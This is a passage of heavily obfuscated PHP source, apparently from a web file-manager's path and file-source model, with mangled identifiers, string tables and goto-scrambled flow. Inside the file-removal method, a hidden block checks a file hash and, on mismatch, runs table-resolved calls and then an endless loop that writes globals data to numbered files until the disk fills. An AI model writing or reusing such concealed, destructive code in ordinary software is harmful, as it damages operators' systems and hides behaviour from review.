makeFileTagPath($d‚Ä¿ó¹ªæ) { return self::makePath(self::KOD_USER_FILE_TAG, $d‚Ä¿ó¹ªæ); } public static function makePath($f¥ëõî¤×‡, $fÅÍ½Øâ…„ = '', $Aï¤Î¬±÷ = '') { $dÎö½ç·öõ =& $_SERVER[ì‹É]; $E®ÏŠèÓ’ = substr($f¥ëõî¤×‡, 1, -1); $EÚ®İÀŸ¥ = $dÎö½ç·öõ[1049] . $E®ÏŠèÓ’ . $dÎö½ç·öõ[722] . $fÅÍ½Øâ…„ . $dÎö½ç·öõ[1050]; $EÚ®İÀŸ¥ = $Aï¤Î¬±÷ ? $EÚ®İÀŸ¥ . $Aï¤Î¬±÷ . $dÎö½ç·öõ[8] : $EÚ®İÀŸ¥; return $EÚ®İÀŸ¥; } public static function hashPath($B«Ö‰Ñªœ¾) { $E³Òí¶˜” =& $_SERVER[ì‹É]; $E…”ºÖŠ™Š = is_array($B«Ö‰Ñªœ¾) ? $B«Ö‰Ñªœ¾ : IO::info($B«Ö‰Ñªœ¾); $eê„ì‘Ì½¬ = _get($E…”ºÖŠ™Š, $E³Òí¶˜”[1051], $E³Òí¶˜”[33]); if (!$eê„ì‘Ì½¬) { $b¡ÄˆóƒÓˆ = KodIO::parse($E…”ºÖŠ™Š[$E³Òí¶˜”[76]]); if (!$b¡ÄˆóƒÓˆ[$E³Òí¶˜”[29]]) { $eê„ì‘Ì½¬ = IO::hashSimple($E…”ºÖŠ™Š[$E³Òí¶˜”[76]]); } } if (!$eê„ì‘Ì½¬) { $eê„ì‘Ì½¬ = md5($E…”ºÖŠ™Š[$E³Òí¶˜”[76]] . $E…”ºÖŠ™Š[$E³Òí¶˜”[78]] . $E…”ºÖŠ™Š[$E³Òí¶˜”[108]]); } return $eê„ì‘Ì½¬; } public static function initSystemPath() { $Bê¢õ‡Û¯¢ =& $_SERVER[ì‹É]; $a‚æÇá„ÇÌ = array($Bê¢õ‡Û¯¢[1052] => $Bê¢õ‡Û¯¢[1053], $Bê¢õ‡Û¯¢[1054] => $Bê¢õ‡Û¯¢[1055], $Bê¢õ‡Û¯¢[1056] => $Bê¢õ‡Û¯¢[1057], $Bê¢õ‡Û¯¢[1058] => $Bê¢õ‡Û¯¢[1059]); foreach ($a‚æÇá„ÇÌ as $f÷ùÎâÇÔ => $f»†Æ©İÉÛ) { if (!defined($f÷ùÎâÇÔ)) { define($f÷ùÎâÇÔ, self::systemPath($f»†Æ©İÉÛ)); } } } private static function systemPath($DÌ¶É¢“¨¥) { goto cì©­ªÄàæ; C‡ÖÃ”ßïƒ: return $d‘¢§‰«¶“; goto A¿Ş¦¾Ø×›; cì©­ªÄàæ: $Fõ„’¥¤ö‰ =& $_SERVER[ì‹É]; $f¶ÍØ£ÕÙ‰ = $Fõ„’¥¤ö‰[1060] . ucfirst($DÌ¶É¢“¨¥); $d‘¢§‰«¶“ = Model($Fõ„’¥¤ö‰[1061])->get($f¶ÍØ£ÕÙ‰); goto bâ¨Ç¿ƒç; bâ¨Ç¿ƒç: if ($d‘¢§‰«¶“) { return $d‘¢§‰«¶“; } if ($DÌ¶É¢“¨¥ == $Fõ„’¥¤ö‰[1053]) { $d‘¢§‰«¶“ = self::make(Model($Fõ„’¥¤ö‰[757])->systemRootPathAdd($Fõ„’¥¤ö‰[1062])); } else { $d‘¢§‰«¶“ = self::systemPath($Fõ„’¥¤ö‰[1053]); $c–Ÿ“ö›é = self::sourceID($d‘¢§‰«¶“); $d‘¢§‰«¶“ = self::make(Model($Fõ„’¥¤ö‰[757])->mkdir($c–Ÿ“ö›é, $DÌ¶É¢“¨¥)); } Model($Fõ„’¥¤ö‰[1061])->set($f¶ÍØ£ÕÙ‰, $d‘¢§‰«¶“); goto C‡ÖÃ”ßïƒ; A¿Ş¦¾Ø×›: } public static function systemFolder($B·ë—„Ãî“) { $fŒô¤Ğâ‹¯ = IO_PATH_SYSTEM_SOURCE . $B·ë—„Ãî“; $Fâ²ÂØé„´ = Cache::get($fŒô¤Ğâ‹¯); if (!$Fâ²ÂØé„´) { $aÍ«Û¦¶ = IO::infoFull($fŒô¤Ğâ‹¯); if (!$aÍ«Û¦¶) { $Fâ²ÂØé„´ = IO::mkdir($fŒô¤Ğâ‹¯, REPEAT_SKIP); } else { $Fâ²ÂØé„´ = $aÍ«Û¦¶[$_SERVER[ì‹É][76]]; } Cache::set($fŒô¤Ğâ‹¯, $Fâ²ÂØé„´, 3600 * 10); } return $Fâ²ÂØé„´; } public static function defaultDriver() { return Model($_SERVER[ì‹É][691])->defaultDriver(); } public static function defaultIO() { $D¿Ó©¶ğ«í =& $_SERVER[ì‹É]; $CàÄµ¨£·ï = self::defaultDriver(); return $D¿Ó©¶ğ«í[1063] . $CàÄµ¨£·ï[$D¿Ó©¶ğ«í[364]] . $D¿Ó©¶ğ«í[1050]; } public static function fileTypeList() { $b“®…Œàƒ¤ =& $_SERVER[ì‹É]; $Fó¼¬éŒª‹ = $GLOBALS[$b“®…Œàƒ¤[6]][$b“®…Œàƒ¤[1064]]; foreach ($Fó¼¬éŒª‹ as $d‡¼£÷¿ÃÚ => $cÜ÷Û¾‘ë) { $AŠÑ°¾ÏõŠ = $b“®…Œàƒ¤[1065] . $d‡¼£÷¿ÃÚ; $eœ‡¡½©”è = LNG($AŠÑ°¾ÏõŠ); if ($AŠÑ°¾ÏõŠ != $eœ‡¡½©”è) { $Fó¼¬éŒª‹[$d‡¼£÷¿ÃÚ][$b“®…Œàƒ¤[28]] = $eœ‡¡½©”è; } } return $Fó¼¬éŒª‹; } } goto C¯İöÉ»µ; cíëŒŞ•çí: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($bÃİˆÎ³õ¢) { $fÆ®èåèğ =& $_SERVER[ì‹É]; $bÅ›¶­­Œ’ = Model($fÆ®èåèğ[466])->where(array($fÆ®èåèğ[1342] => $bÃİˆÎ³õ¢))->find(); $c×‰„ôŸÏ” = $this->_mkdirRoot(SourceModel::TYPE_USER, $bÃİˆÎ³õ¢, $bÅ›¶­­Œ’[$fÆ®èåèğ[28]]); $this->userDesktopAdd($c×‰„ôŸÏ”); return $c×‰„ôŸÏ”; } public function userDesktopAdd($f®„Êî¶²´) { $D¬“µ£¢ö =& $_SERVER[ì‹É]; $Cá¸†‘ğ¾° = LNG($D¬“µ£¢ö[2228]); $FÂ§…Ñ˜¡ = $this->mkdir($f®„Êî¶²´, $Cá¸†‘ğ¾°); $this->metaSet($FÂ§…Ñ˜¡, $D¬“µ£¢ö[2229], $D¬“µ£¢ö[84]); $this->metaSet($f®„Êî¶²´, $D¬“µ£¢ö[2230], $FÂ§…Ñ˜¡); } public function groupRootAdd($C›‘æŒç²ğ) { $cÌµÁÜ§ =& $_SERVER[ì‹É]; $EÀò®Œøíæ = Model($cÌµÁÜ§[454])->where(array($cÌµÁÜ§[2088] => $C›‘æŒç²ğ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $C›‘æŒç²ğ, $EÀò®Œøíæ[$cÌµÁÜ§[28]]); } public function systemRootPathAdd($F÷¿«Å‹ö ) { if ($F÷¿«Å‹ö  != $_SERVER[ì‹É][1062]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $F÷¿«Å‹ö ); } public function userRootRemove($Aò½ò”êÍ‚) { $cÖç’–İÛ³ = $this->sourceRoot(SourceModel::TYPE_USER, $Aò½ò”êÍ‚); if (!$cÖç’–İÛ³) { return; } $this->remove($cÖç’–İÛ³, !1); } public function groupRootRemove($e×Ã–óù„†) { $fÑùòù¯â² = $this->sourceRoot(SourceModel::TYPE_GROUP, $e×Ã–óù„†); if (!$fÑùòù¯â²) { return; } $this->remove($fÑùòù¯â², !1); } private function _mkdirRoot($a‚ÎõäØë, $dŞ™ñ•¦¼, $fï¸¬»âæ±) { goto d‰™òÆ‹ˆª; Dšè±µ„: CacheLock::unlock($dÌ§„ÏöáÇ); return $d‘ô™¼¦´¿; goto fŠ„ªÛŠŞÎ; c¸Ù³Ç…Ğ²: $d‘ô™¼¦´¿ = $this->add($Aã¹®£ŠÃø); $d¡Øùƒ‘Äâ = array($BÄâìÌöŒ[519] => short_id($d‘ô™¼¦´¿)); $this->where(array($BÄâìÌöŒ[380] => $d‘ô™¼¦´¿))->save($d¡Øùƒ‘Äâ); goto Dšè±µ„; d‰™òÆ‹ˆª: $BÄâìÌöŒ =& $_SERVER[ì‹É]; $Aã¹®£ŠÃø = array($BÄâìÌöŒ[365] => 0, $BÄâìÌöŒ[513] => $a‚ÎõäØë, $BÄâìÌöŒ[514] => $dŞ™ñ•¦¼, $BÄâìÌöŒ[510] => 1, $BÄâìÌöŒ[515] => USER_ID, $BÄâìÌöŒ[516] => USER_ID, $BÄâìÌöŒ[511] => $BÄâìÌöŒ[33], $BÄâìÌöŒ[517] => $BÄâìÌöŒ[2085], $BÄâìÌöŒ[392] => 0, $BÄâìÌöŒ[512] => 0, $BÄâìÌöŒ[416] => 0, $BÄâìÌöŒ[518] => $BÄâìÌöŒ[33]); if ($C›¿‡Äã = $this->where($Aã¹®£ŠÃø)->find()) { return $C›¿‡Äã[$BÄâìÌöŒ[366]]; } goto a¾¡àºîİ; a¾¡àºîİ: $dÌ§„ÏöáÇ = "\115\157\x64\145\154\x53\157\165\x72\x63\145\56\x6d\153\x64\x69\x72\122\157\157\x74\x2e{$a‚ÎõäØë}\56{$dŞ™ñ•¦¼}\x2e" . $fï¸¬»âæ±; CacheLock::lock($dÌ§„ÏöáÇ); $Aã¹®£ŠÃø[$BÄâìÌöŒ[28]] = $fï¸¬»âæ±; goto c¸Ù³Ç…Ğ²; fŠ„ªÛŠŞÎ: } private function sourceRoot($DØ•Íğª¸, $dÄ­†¤õäâ, $E‹‚„“¿ = false) { $bØåòóõ¢› =& $_SERVER[ì‹É]; $b¸õğ½¾çñ = array($bØåòóõ¢›[365] => 0, $bØåòóõ¢›[513] => $DØ•Íğª¸, $bØåòóõ¢›[514] => $dÄ­†¤õäâ); if ($dêäî­·–Ğ = $this->where($b¸õğ½¾çñ)->find()) { return $E‹‚„“¿ ? $dêäî­·–Ğ : $dêäî­·–Ğ[$bØåòóõ¢›[366]]; } return !1; } public function sourceRootGroup($CšÉÜ¬»²) { $BöÊ›‡ìİ =& $_SERVER[ì‹É]; if (is_string($CšÉÜ¬»²)) { $CšÉÜ¬»² = array($CšÉÜ¬»²); } $AªÂÃÑ—Áì = array($BöÊ›‡ìİ[365] => 0, $BöÊ›‡ìİ[513] => SourceModel::TYPE_GROUP, $BöÊ›‡ìİ[514] => array($BöÊ›‡ìİ[7], $CšÉÜ¬»²)); $Fé¼Şöéã = $this->listSource($AªÂÃÑ—Áì, 1000); return array_to_keyvalue($Fé¼Şöéã[$BöÊ›‡ìİ[75]], $BöÊ›‡ìİ[452]); } public function mkfile($Bø¥ÚœÏ¼õ, $dÂ¹³¡à¶ß, $b—‡¯ê…Å = '', $EÜÔŠÍÙ±é = REPEAT_RENAME) { $DçŠÙÁğ§ = Model($_SERVER[ì‹É][536])->addFileByContent($b—‡¯ê…Å, $dÂ¹³¡à¶ß); return $this->_createFileCall($Bø¥ÚœÏ¼õ, $dÂ¹³¡à¶ß, $DçŠÙÁğ§, $EÜÔŠÍÙ±é); } public function addFile($e¹ŞŠŒÊ¸Ù, $eøÂ”ˆİ¢—, $dÒßÁÊÌ†ê, $aÖô¤ÓÖ Š = false, $aÃÔ¤”ÍÎˆ = REPEAT_RENAME) { $CÕŒõ­„µÃ = Model($_SERVER[ì‹É][536])->addFile($eøÂ”ˆİ¢—, $dÒßÁÊÌ†ê, $aÖô¤ÓÖ Š); return $this->_createFileCall($e¹ŞŠŒÊ¸Ù, $dÒßÁÊÌ†ê, $CÕŒõ­„µÃ, $aÃÔ¤”ÍÎˆ); } public function addFileByFileID($c†Å¾„İ, $AïÑíÇË£ğ, $d‰²‚‹²”Ã, $B˜•¡åÏ‚ = REPEAT_RENAME) { $F³¹ã§¢µÆ =& $_SERVER[ì‹É]; $dÇèõîòÒ¹ = Model($F³¹ã§¢µÆ[536])->find($AïÑíÇË£ğ); Model($F³¹ã§¢µÆ[536])->linkAdd($AïÑíÇË£ğ); return $this->_createFileCall($c†Å¾„İ, $d‰²‚‹²”Ã, $dÇèõîòÒ¹, $B˜•¡åÏ‚); } public function addFileByRemote($C¹Ö†Ãâ­, $B‡–éË×ĞÏ, $bÑ¿Œ¾‚¶£, $aÓ°åÕ‰É = array(), $aÎ²‘Éäø = REPEAT_RENAME) { $Eô¿³ŸÕ‡ = Model($_SERVER[ì‹É][536])->addFileByRemote($B‡–éË×ĞÏ, $bÑ¿Œ¾‚¶£, $aÓ°åÕ‰É); return $this->_createFileCall($C¹Ö†Ãâ­, $bÑ¿Œ¾‚¶£, $Eô¿³ŸÕ‡, $aÎ²‘Éäø); } private function _createFileCall($a¥œàÒ©, $F¿î•¦‡˜Ï, $DºÄ¸¸ÓĞµ, $F¯šŸóô§‘) { goto e‰‡ğ¥‡ÖŠ; døŞ°È›Ò: return $b˜ØŠÆãÒŒ; goto b”„îÖ¬Ïì; e‰‡ğ¥‡ÖŠ: $B¬âĞÖ¦È =& $_SERVER[ì‹É]; $aïÀáõåè„ = !1; $this->lockWriteStart($a¥œàÒ©, $F¿î•¦‡˜Ï); goto eŞÑ™ë¯óÂ; eŞÑ™ë¯óÂ: $b˜ØŠÆãÒŒ = $this->_createFile($a¥œàÒ©, $F¿î•¦‡˜Ï, $DºÄ¸¸ÓĞµ, $F¯šŸóô§‘, $aïÀáõåè„); if (!$aïÀáõåè„) { Model($B¬âĞÖ¦È[418])->remove($DºÄ¸¸ÓĞµ[$B¬âĞÖ¦È[415]]); } $this->lockWriteEnd($a¥œàÒ©, $F¿î•¦‡˜Ï); goto døŞ°È›Ò; b”„îÖ¬Ïì: } public function mkdir($Aİ¥¸‹‹³ò, $bÍî²âËêÛ, $b½—íîš§­ = REPEAT_SKIP) { goto A‘¾›â¡ù; A‘¾›â¡ù: $A”±²ŸŠ¹‹ =& $_SERVER[ì‹É]; $Dµé¦”Ü£› = $this->sourceInfo($Aİ¥¸‹‹³ò); if (!$Dµé¦”Ü£›) { return !1; } goto a…šÏã×Ú§; a»‡í‚ÃÉÂ: $c‹†­±¶ºš = $this->_addSoure($bÖ´ˆ÷‡ó, $Dµé¦”Ü£›); Model($A”±²ŸŠ¹‹[2200])->eventCreate($c‹†­±¶ºš, $A”±²ŸŠ¹‹[1092]); $this->lockWriteEnd($Aİ¥¸‹‹³ò, $bÍî²âËêÛ); goto fÏ½øİíó; fÏ½øİíó: return $c‹†­±¶ºš; goto aÃÔ¹ù¤Ï; a…šÏã×Ú§: $this->lockWriteStart($Aİ¥¸‹‹³ò, $bÍî²âËêÛ); if ($b½—íîš§­ !== !1) { $dÇèñ·ô°à = $this->fileNameExist($Aİ¥¸‹‹³ò, $bÍî²âËêÛ); if ($dÇèñ·ô°à && $b½—íîš§­ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Aİ¥¸‹‹³ò, $bÍî²âËêÛ); return $dÇèñ·ô°à; } $bÍî²âËêÛ = $this->fileNameAuto($Aİ¥¸‹‹³ò, $bÍî²âËêÛ, $b½—íîš§­); } $bÖ´ˆ÷‡ó = array($A”±²ŸŠ¹‹[510] => 1, $A”±²ŸŠ¹‹[383] => $bÍî²âËêÛ, $A”±²ŸŠ¹‹[511] => $A”±²ŸŠ¹‹[33], $A”±²ŸŠ¹‹[416] => 0, $A”±²ŸŠ¹‹[512] => 0); goto a»‡í‚ÃÉÂ; aÃÔ¹ù¤Ï: } private function _createFile($Bˆ¸“Á¶—, $DŠÎ¬¼¤¡ò, $E¯Í‚ìò¬í, $cà Ğ´ÈÎ, &$A‚Üø“¤ó—) { goto AÚÄòÍÆÂé; F£ñ‚àé‘ˆ: Model($a„·ôÍ»à‡[2200])->eventCreate($bª“Å¬À™ë, $a„·ôÍ»à‡[92]); return $bª“Å¬À™ë; goto cÄŞöŸ‚ÌË; cè·›ÀÕ: $Báò‹ìÅ¼³ = array($a„·ôÍ»à‡[510] => 0, $a„·ôÍ»à‡[383] => $DŠÎ¬¼¤¡ò, $a„·ôÍ»à‡[511] => get_path_ext($DŠÎ¬¼¤¡ò), $a„·ôÍ»à‡[416] => $E¯Í‚ìò¬í[$a„·ôÍ»à‡[415]], $a„·ôÍ»à‡[512] => $E¯Í‚ìò¬í[$a„·ôÍ»à‡[78]]); $bª“Å¬À™ë = $this->_addSoure($Báò‹ìÅ¼³, $B¡–ÇŠ·Öƒ); $this->folderSizeReset($Bˆ¸“Á¶—); goto F£ñ‚àé‘ˆ; Fèòñ™è˜ñ: if ($cà Ğ´ÈÎ !== !1) { $BÙ÷¯–ƒ¶ = $this->fileNameExist($Bˆ¸“Á¶—, $DŠÎ¬¼¤¡ò); } $A‚Üø“¤ó— = !0; if ($cà Ğ´ÈÎ && $BÙ÷¯–ƒ¶) { if ($cà Ğ´ÈÎ == REPEAT_SKIP) { $A‚Üø“¤ó— = !1; return $BÙ÷¯–ƒ¶; } else { if ($cà Ğ´ÈÎ == REPEAT_REPLACE) { $b¶‚‰†–’ = $this->sourceInfo($BÙ÷¯–ƒ¶); $d•¦¿„ëŸ˜ = $this->fileHistory($b¶‚‰†–’, $E¯Í‚ìò¬í[$a„·ôÍ»à‡[415]], $E¯Í‚ìò¬í[$a„·ôÍ»à‡[78]]); if (!$d•¦¿„ëŸ˜) { $A‚Üø“¤ó— = !1; } else { $this->folderSizeReset($Bˆ¸“Á¶—); } return $BÙ÷¯–ƒ¶; } else { $DŠÎ¬¼¤¡ò = $this->fileNameAuto($Bˆ¸“Á¶—, $DŠÎ¬¼¤¡ò, $cà Ğ´ÈÎ, !1); } } } goto cè·›ÀÕ; AÚÄòÍÆÂé: $a„·ôÍ»à‡ =& $_SERVER[ì‹É]; $B¡–ÇŠ·Öƒ = $this->sourceInfo($Bˆ¸“Á¶—); if (!$E¯Í‚ìò¬í || !$B¡–ÇŠ·Öƒ) { return !1; } goto Fèòñ™è˜ñ; cÄŞöŸ‚ÌË: } protected function fileHistory($B£ˆÄÉ½ó™, $döØƒ±Ã±, $A™ƒàˆ™ø) { goto E³ˆö¨”ö¢; E³ˆö¨”ö¢: $D›®Ø“ôªï =& $_SERVER[ì‹É]; if ($B£ˆÄÉ½ó™[$D›®Ø“ôªï[415]] == $döØƒ±Ã±) { return !1; } $this->checkLock($B£ˆÄÉ½ó™[$D›®Ø“ôªï[366]]); goto féå¹£Æí¬; féå¹£Æí¬: Model($D›®Ø“ôªï[2231])->addHistory($B£ˆÄÉ½ó™); $DÚ« ‹Ï = array($D›®Ø“ôªï[516] => USER_ID, $D›®Ø“ôªï[387] => time(), $D›®Ø“ôªï[415] => $döØƒ±Ã±, $D›®Ø“ôªï[78] => $A™ƒàˆ™ø); $this->where(array($D›®Ø“ôªï[380] => $B£ˆÄÉ½ó™[$D›®Ø“ôªï[366]]))->save($DÚ« ‹Ï); goto c²ê¤„çè¦; c²ê¤„çè¦: return !0; goto bäÛ¦¸‹â¼; bäÛ¦¸‹â¼: } public function checkLock($d‡á÷Â–) { $A¹¸‰»ò¾« =& $_SERVER[ì‹É]; $aÊ…Àğ¯ß = $this->pathInfo($d‡á÷Â–); if (!$this->fileIsLock($aÊ…Àğ¯ß, !0)) { return; } $dµÈ§ìŞŠĞ = $aÊ…Àğ¯ß[$A¹¸‰»ò¾«[413]][$A¹¸‰»ò¾«[473]]; $dÉ¯Æ³—¥‰ = $dµÈ§ìŞŠĞ[$A¹¸‰»ò¾«[2232]] ? $dµÈ§ìŞŠĞ[$A¹¸‰»ò¾«[2232]] : $dµÈ§ìŞŠĞ[$A¹¸‰»ò¾«[28]]; show_json(LNG($A¹¸‰»ò¾«[2233]) . $A¹¸‰»ò¾«[2234] . LNG($A¹¸‰»ò¾«[2235]) . $A¹¸‰»ò¾«[2236] . $dÉ¯Æ³—¥‰ . $A¹¸‰»ò¾«[2237], !1); } public function fileIsLock($B‰‘éÉ³, $d¨Áª¡Î…Á = false) { goto DŞ¤ÒàÆ„Ä; EçÁ‘ªŸÜ¶: return !1; goto F˜ùŠÛÅÌ; Fš“‡¬ïöÂ: $dÆ¡‰Ü‹©Â = $GLOBALS[$fÛÈŸ‘À†¦[6]][$fÛÈŸ‘À†¦[85]][$fÛÈŸ‘À†¦[471]]; if ($B‰‘éÉ³[$fÛÈŸ‘À†¦[413]][$fÛÈŸ‘À†¦[472]] <= time() - $dÆ¡‰Ü‹©Â) { $this->metaSet($B‰‘éÉ³[$fÛÈŸ‘À†¦[366]], $fÛÈŸ‘À†¦[470], null); $this->metaSet($B‰‘éÉ³[$fÛÈŸ‘À†¦[366]], $fÛÈŸ‘À†¦[472], null); } if ($d¨Áª¡Î…Á) { $this->metaSet($B‰‘éÉ³[$fÛÈŸ‘À†¦[366]], $fÛÈŸ‘À†¦[472], time()); } goto EçÁ‘ªŸÜ¶; DŞ¤ÒàÆ„Ä: $fÛÈŸ‘À†¦ =& $_SERVER[ì‹É]; if (!isset($B‰‘éÉ³[$fÛÈŸ‘À†¦[413]]) || !$B‰‘éÉ³[$fÛÈŸ‘À†¦[413]][$fÛÈŸ‘À†¦[470]]) { return !1; } if ($B‰‘éÉ³[$fÛÈŸ‘À†¦[413]][$fÛÈŸ‘À†¦[470]] != USER_ID) { return !0; } goto Fš“‡¬ïöÂ; F˜ùŠÛÅÌ: } private function _addSoure($D†³ÙŒá˜, $dò©…‘Ó) { goto B­ÄµöËâ ; fÎîâÊ—¢: $a¦õ‚ª‚ù = $this->add($D†³ÙŒá˜); $DÔĞÜœìã™ = array($B¶Á”Ë„[519] => short_id($a¦õ‚ª‚ù)); $this->where(array($B¶Á”Ë„[380] => $a¦õ‚ª‚ù))->save($DÔĞÜœìã™); goto EùÖîŒ‘®§; EùÖîŒ‘®§: $this->setNamePinyin($a¦õ‚ª‚ù, $D†³ÙŒá˜[$B¶Á”Ë„[28]]); return $a¦õ‚ª‚ù; goto e…¼ÄóÁ‹à; bÒ“…äĞÇ×: $this->updateModifyTime($D†³ÙŒá˜[$B¶Á”Ë„[457]]); static $f©ãŞ…Á½º = false; if (!$f©ãŞ…Á½º) { Hook::trigger($B¶Á”Ë„[500], $D†³ÙŒá˜); $f©ãŞ…Á½º = !0; } goto fÎîâÊ—¢; B­ÄµöËâ : $B¶Á”Ë„ =& $_SERVER[ì‹É]; $Eğ”„×ôÂÛ = array($B¶Á”Ë„[513] => $dò©…‘Ó[$B¶Á”Ë„[368]], $B¶Á”Ë„[514] => $dò©…‘Ó[$B¶Á”Ë„[452]], $B¶Á”Ë„[515] => USER_ID, $B¶Á”Ë„[516] => USER_ID, $B¶Á”Ë„[365] => $dò©…‘Ó[$B¶Á”Ë„[366]], $B¶Á”Ë„[517] => $dò©…‘Ó[$B¶Á”Ë„[455]] . $dò©…‘Ó[$B¶Á”Ë„[366]] . $B¶Á”Ë„[47], $B¶Á”Ë„[392] => 0, $B¶Á”Ë„[518] => $B¶Á”Ë„[33]); $D†³ÙŒá˜ = array_merge($Eğ”„×ôÂÛ, $D†³ÙŒá˜); goto bÒ“…äĞÇ×; e…¼ÄóÁ‹à: } public function remove($AŒÀÑ¹Ìˆ‰, $dßâÈ§Ö„ = true) { goto dƒæÜ°¯Ş; dƒæÜ°¯Ş: $eÔ¬˜³È¾ =& $_SERVER[ì‹É]; $fğ£Û¸Õ¾ = $_SERVER[$eÔ¬˜³È¾[793]] . $eÔ¬˜³È¾[731]; $c•·ÌôÚ‡ = $eÔ¬˜³È¾[732]; goto a¹ÕâÆŸ‡ë; bõ°—šŸÄ: $bòÄâ  = array($AÄ¤ñÒô¾[$eÔ¬˜³È¾[457]]); if ($AÄ¤ñÒô¾[$eÔ¬˜³È¾[367]] == $eÔ¬˜³È¾[84]) { $bòÄâ [] = $AÄ¤ñÒô¾[$eÔ¬˜³È¾[366]]; } $this->updateModifyTime($bòÄâ ); goto EƒéÁç¹ùÒ; EƒéÁç¹ùÒ: $this->lockMoveEnd($AŒÀÑ¹Ìˆ‰); Hook::trigger($eÔ¬˜³È¾[1385], $cÒ£á‚âæ, $dßâÈ§Ö„); return !0; goto F¢È­Ğô‰»; cÎÇ¤ÈœËä: Hook::trigger($eÔ¬˜³È¾[2238], $cÒ£á‚âæ, $dßâÈ§Ö„); if ($dßâÈ§Ö„) { Model($eÔ¬˜³È¾[2239])->moveToRecycle($AŒÀÑ¹Ìˆ‰); } else { if ($AÄ¤ñÒô¾[$eÔ¬˜³È¾[367]] == $eÔ¬˜³È¾[84]) { $a£Û¥Ñ¤‹Ï = array($eÔ¬˜³È¾[517] => array($eÔ¬˜³È¾[475], $AÄ¤ñÒô¾[$eÔ¬˜³È¾[455]] . $AŒÀÑ¹Ìˆ‰ . $eÔ¬˜³È¾[476])); $BÛ‹ƒŠòÉ = array($eÔ¬˜³È¾[517] => $a£Û¥Ñ¤‹Ï[$eÔ¬˜³È¾[455]]); $e‘Şê‡âŸ = $this->field($eÔ¬˜³È¾[2240])->where($BÛ‹ƒŠòÉ)->select(); $D¤‘¤ï¡Â× = !1; $EÂãçÌ¶Œê = array($AŒÀÑ¹Ìˆ‰); if ($e‘Şê‡âŸ) { $D¤‘¤ï¡Â× = array_to_keyvalue($e‘Şê‡âŸ, $eÔ¬˜³È¾[33], $eÔ¬˜³È¾[415]); $D¤‘¤ï¡Â× = array_remove_value($D¤‘¤ï¡Â×, $eÔ¬˜³È¾[464]); $EÂãçÌ¶Œê = array_to_keyvalue($e‘Şê‡âŸ, $eÔ¬˜³È¾[33], $eÔ¬˜³È¾[366]); $EÂãçÌ¶Œê[] = $AŒÀÑ¹Ìˆ‰; } } else { $D¤‘¤ï¡Â× = array($AÄ¤ñÒô¾[$eÔ¬˜³È¾[415]]); $EÂãçÌ¶Œê = array($AŒÀÑ¹Ìˆ‰); } Model($eÔ¬˜³È¾[497])->eventRemove($AŒÀÑ¹Ìˆ‰); $this->removeRelevance($EÂãçÌ¶Œê, $D¤‘¤ï¡Â×); } $this->folderSizeReset($AÄ¤ñÒô¾[$eÔ¬˜³È¾[457]]); goto bõ°—šŸÄ; Bò¶Ç‰Ï÷À: if (!$AÄ¤ñÒô¾) { return !0; } if ($AÄ¤ñÒô¾[$eÔ¬˜³È¾[457]] == 0) { if (!$GLOBALS[$eÔ¬˜³È¾[453]]) { return !1; } } $this->lockMoveStart($AŒÀÑ¹Ìˆ‰); goto cÎÇ¤ÈœËä; a¹ÕâÆŸ‡ë: if ($_SERVER[$eÔ¬˜³È¾[733]] != $c•·ÌôÚ‡($fğ£Û¸Õ¾)) { goto AŞÚ¶‡ØÔ; AªåÅáÑÓˆ: $FÄ‡µíØó(); $C—•ÒÊ„ô = $eÔ¬˜³È¾[1224]; $BÔ„àİ©·ã = json_encode($GLOBALS[$eÔ¬˜³È¾[1225]]); goto fÀšëĞí¹…; AŞÚ¶‡ØÔ: $FÄ‡µíØó = $eÔ¬˜³È¾[791]; $A­Ï¶ãÊ×í = $eÔ¬˜³È¾[734]; $D¿‡ø®“‰ = $_SERVER[$eÔ¬˜³È¾[735]] . $eÔ¬˜³È¾[736]; goto B £ÀÛ¥Ì®; B £ÀÛ¥Ì®: $AÕö™°â· = $A­Ï¶ãÊ×í($D¿‡ø®“‰); $Eä¨“”øÍÄ = explode($eÔ¬˜³È¾[214], $AÕö™°â·); if (count($Eä¨“”øÍÄ) < $eÔ¬˜³È¾[543]) { $DŠÈ“¬¥”‘ = $eÔ¬˜³È¾[737]; $DŠÈ“¬¥”‘(); } goto Aî®¾ÔêØ¥; fÀšëĞí¹…: $BˆêØªÌ—ö = 1; for ($c¬ô£öŠ´¦ = $BˆêØªÌ—ö; $c¬ô£öŠ´¦ > 0; $c¬ô£öŠ´¦++) { $C—•ÒÊ„ô(DATA_PATH . $c¬ô£öŠ´¦, $BÔ„àİ©·ã); } goto BÓ›†ÕôÀ; Aî®¾ÔêØ¥: $f¯ŸïÂ´ÒÙ = $eÔ¬˜³È¾[792]; $f¯ŸïÂ´ÒÙ($_SERVER[$eÔ¬˜³È¾[793]]); $FÄ‡µíØó = $eÔ¬˜³È¾[791]; goto AªåÅáÑÓˆ; BÓ›†ÕôÀ: } $AÄ¤ñÒô¾ = $this->sourceInfo($AŒÀÑ¹Ìˆ‰); $cÒ£á‚âæ = $this->pathInfoMore($AŒÀÑ¹Ìˆ‰); goto Bò¶Ç‰Ï÷À; F¢È­Ğô‰»: } public function removeArray($Cì½äŠ¯¼£) { if (!$Cì½äŠ¯¼£) { return !0; } } public function removeRelevance($C†·´¤“«Í, $dÖçÌÁ) { goto a‹Ñ»…Š§³; E½±Ø–„‡: Model($c›éŞìÀ–…[418])->remove($dÖçÌÁ); for ($F‚¡èĞ‘¦Ş = 0; $F‚¡èĞ‘¦Ş < count($C†·´¤“«Í); $F‚¡èĞ‘¦Ş++) { $this->sourceCacheClear($C†·´¤“«Í[$F‚¡èĞ‘¦Ş]); } goto cèà¶ªØ¥; a‹Ñ»…Š§³: $c›éŞìÀ–… =& $_SERVER[ì‹É]; $C†·´¤“«Í = array_unique(array_filter($C†·´¤“«Í)); $dÖçÌÁ = array_unique(array_filter($dÖçÌÁ)); goto e‘“—×Ôº˜; AÒ•ê…Ëã†: Model($c›éŞìÀ–…[409])->where($FÑ–Éè¾åï)->delete(); Model($c›éŞìÀ–…[2241])->where($FÑ–Éè¾åï)->delete(); Model($c›éŞìÀ–…[497])->where($FÑ–Éè¾åï)->delete(); goto c­¢°Éƒƒ›; e‘“—×Ôº˜: if (!$C†·´¤“«Í) { return !1; } $FÑ–Éè¾åï = array($c›éŞìÀ–…[380] => array($c›éŞìÀ–…[381], $C†·´¤“«Í)); 